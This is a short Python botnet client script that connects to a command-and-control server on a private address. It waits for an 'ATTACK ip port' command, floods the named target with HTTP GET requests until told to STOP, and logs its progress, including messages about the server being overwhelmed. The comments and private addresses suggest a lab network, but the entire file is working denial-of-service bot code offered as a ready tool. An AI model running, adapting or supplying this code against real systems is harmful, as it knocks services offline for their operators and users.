#!/usr/bin/env python3
# Bot script - runs on ws2 and ws3
# Connects to C&C server and waits for attack command


import socket
import threading
import time

CNC_IP = "10.2.0.2"
CNC_PORT = 9999

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def http_flood(target_ip, target_port, stop_event, bot_id):
    print(f"[BOT-{bot_id}] Starting HTTP flood on {target_ip}:{target_port}")
    count = 0
    failed = 0
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, int(target_port)))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            count += 1
            if count % 10 == 0:
                print(f"[BOT-{bot_id}] [OK] {count} requests sent | [FAIL] {failed} failed")
            s.close()
        except Exception as e:
            failed += 1
            if failed % 10 == 0:
                print(f"[BOT-{bot_id}] [FAIL] {failed} requests failed (server overwhelmed!)")

def main():
    my_ip = get_my_ip()
    bot_id = my_ip.split(".")[-1]

    print(f"[BOT-{bot_id}] Starting up...")
    print(f"[BOT-{bot_id}] Connecting to C&C at {CNC_IP}:{CNC_PORT}")

    while True:
        try:
            cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cnc.connect((CNC_IP, CNC_PORT))
            print(f"[BOT-{bot_id}] [OK] Connected to C&C! Waiting for commands...")
            break
        except:
            print(f"[BOT-{bot_id}] C&C not ready, retrying in 2s...")
            time.sleep(2)

    stop_event = threading.Event()
    attack_thread = None

    while True:
        command = cnc.recv(1024).decode().strip()
        print(f"[BOT-{bot_id}] Received command: {command}")

        if command.startswith("ATTACK"):
            _, target_ip, target_port = command.split()
            print(f"[BOT-{bot_id}] Launching attack on {target_ip}:{target_port}")
            stop_event.clear()
            attack_thread = threading.Thread(
                target=http_flood,
                args=(target_ip, target_port, stop_event, bot_id)
            )
            attack_thread.start()

        elif command == "STOP":
            print(f"[BOT-{bot_id}] Stopping attack...")
            stop_event.set()
            if attack_thread:
                attack_thread.join()
            print(f"[BOT-{bot_id}] [OK] Attack stopped")
            break

    cnc.close()
    print(f"[BOT-{bot_id}] Disconnected from C&C")

if __name__ == "__main__":
    main()